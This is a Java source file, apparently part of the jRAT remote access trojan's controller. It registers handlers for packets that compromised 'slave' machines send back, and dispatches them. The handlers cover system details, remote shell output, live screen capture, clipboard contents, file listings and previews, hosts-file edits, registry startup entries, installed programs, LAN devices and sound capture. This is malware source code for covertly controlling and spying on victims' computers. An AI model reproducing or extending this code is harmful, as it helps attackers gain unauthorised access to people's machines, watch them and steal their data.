package io.jrat.controller.packets.incoming;

import io.jrat.common.PacketRange;
import io.jrat.controller.Slave;
import io.jrat.controller.addons.PluginEventHandler;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;


public class IncomingPackets {

	private static final Map<Short, Class<? extends AbstractIncomingPacket>> PACKETS_INCOMING = new HashMap<Short, Class<? extends AbstractIncomingPacket>>();

	public static Map<Short, Class<? extends AbstractIncomingPacket>> getIncomingPackets() {
		return PACKETS_INCOMING;
	}

	static {
		reload();
	}

	private static void reload() {
		PACKETS_INCOMING.clear();
		
		PACKETS_INCOMING.put((short) 2, Packet2Status.class);
		PACKETS_INCOMING.put((short) 3, Packet3Initialized.class);
		PACKETS_INCOMING.put((short) 4, Packet4InitOperatingSystem.class);
		PACKETS_INCOMING.put((short) 5, Packet5InitUserHost.class);
		PACKETS_INCOMING.put((short) 6, Packet6InitVersion.class);
		PACKETS_INCOMING.put((short) 7, Packet7InitServerID.class); //
		PACKETS_INCOMING.put((short) 8, Packet8InitCountry.class);
		PACKETS_INCOMING.put((short) 9, Packet9InitJavaVersion.class);
		PACKETS_INCOMING.put((short) 10, Packet10InitInstallPath.class);
		PACKETS_INCOMING.put((short) 11, Packet11InitInstallationDate.class);
		PACKETS_INCOMING.put((short) 12, Packet12InitLocalAddress.class);
		PACKETS_INCOMING.put((short) 13, Packet13InitTotalMemory.class);
		PACKETS_INCOMING.put((short) 14, Packet14InitAvailableCores.class);
		PACKETS_INCOMING.put((short) 15, Packet15InitJavaPath.class);
		PACKETS_INCOMING.put((short) 16, Packet16LoadedPlugins.class);
		PACKETS_INCOMING.put((short) 17, Packet17InitDrives.class);
		PACKETS_INCOMING.put((short) 18, Packet18InitMonitors.class);	
		PACKETS_INCOMING.put((short) 19, Packet19InitCPU.class);
		PACKETS_INCOMING.put((short) 20, Packet20Headless.class);
		PACKETS_INCOMING.put((short) 21, Packet21RemoteShell.class);
		PACKETS_INCOMING.put((short) 22, Packet22ListFiles.class);
		//23
		PACKETS_INCOMING.put((short) 24, Packet24UsedMemory.class);
		PACKETS_INCOMING.put((short) 25, Packet25Process.class);
		PACKETS_INCOMING.put((short) 26, Packet26RemoteScreen.class);
		PACKETS_INCOMING.put((short) 27, Packet27URLStatus.class);
		//28
		PACKETS_INCOMING.put((short) 29, Packet29ServerDownloadPart.class);		
		PACKETS_INCOMING.put((short) 30, Packet30BeginServerDownload.class);
		PACKETS_INCOMING.put((short) 31, Packet31CompleteServerDownload.class);
		//32
		PACKETS_INCOMING.put((short) 32, Packet32SystemProperties.class);
		PACKETS_INCOMING.put((short) 33, Packet33Thumbnail.class);
		PACKETS_INCOMING.put((short) 34, Packet34CustomDirectory.class);
		PACKETS_INCOMING.put((short) 35, Packet35ChatMessage.class);	
		//36
		PACKETS_INCOMING.put((short) 37, Packet37SearchResult.class);
		PACKETS_INCOMING.put((short) 38, Packet38HostFile.class);
		PACKETS_INCOMING.put((short) 39, Packet39HostEditResult.class);
		// 40
		PACKETS_INCOMING.put((short) 41, Packet41Clipboard.class);
		PACKETS_INCOMING.put((short) 42, Packet42PreviewFile.class);
		PACKETS_INCOMING.put((short) 43, Packet43PreviewImage.class);
		PACKETS_INCOMING.put((short) 44, Packet44SystemJavaProperty.class);
		PACKETS_INCOMING.put((short) 45, Packet45ArchivePreview.class);
		PACKETS_INCOMING.put((short) 46, Packet46FileHash.class);
		// 48
		PACKETS_INCOMING.put((short) 49, Packet49LanDevices.class);
		PACKETS_INCOMING.put((short) 50, Packet50IPConfig.class);
		PACKETS_INCOMING.put((short) 51, Packet51ActivePort.class);
		PACKETS_INCOMING.put((short) 52, Packet52WindowsService.class);
		PACKETS_INCOMING.put((short) 53, Packet53RegistryStartup.class);
		PACKETS_INCOMING.put((short) 54, Packet54Registry.class);
		PACKETS_INCOMING.put((short) 55, Packet55InstalledProgram.class);
		PACKETS_INCOMING.put((short) 56, Packet56NetworkAdapter.class);
		//57
		PACKETS_INCOMING.put((short) 58, Packet58ServerDownloadSoundCapture.class);
		PACKETS_INCOMING.put((short) 59, Packet59ThumbnailPreview.class);
		PACKETS_INCOMING.put((short) 60, Packet60Error.class);		
		//61
		//62
		//63
		//64
		PACKETS_INCOMING.put((short) 65, Packet65ErrorLog.class);
		//66
		//67
		PACKETS_INCOMING.put((short) 68, Packet68RemoteScreenComplete.class);	
		//69
		//70
		PACKETS_INCOMING.put((short) 71, Packet71AllThumbnails.class);
	}

	public static boolean execute(short header, Slave slave) {
		try {
			AbstractIncomingPacket ac = null;
			Set<Short> set = PACKETS_INCOMING.keySet();

			for (Short s : set) {
				if (s == header) {
					ac = PACKETS_INCOMING.get(s).newInstance();
					break;
				}
			}

			if (ac != null && header >= 0 && header <= PacketRange.RANGE_INCOMING) {
				ac.read(slave, slave.getDataInputStream());
			} else {
				PluginEventHandler.onPacket(slave, header);
			}

			return ac != null;
		} catch (Exception ex) {
			ex.printStackTrace();
			return false;
		}
	}

}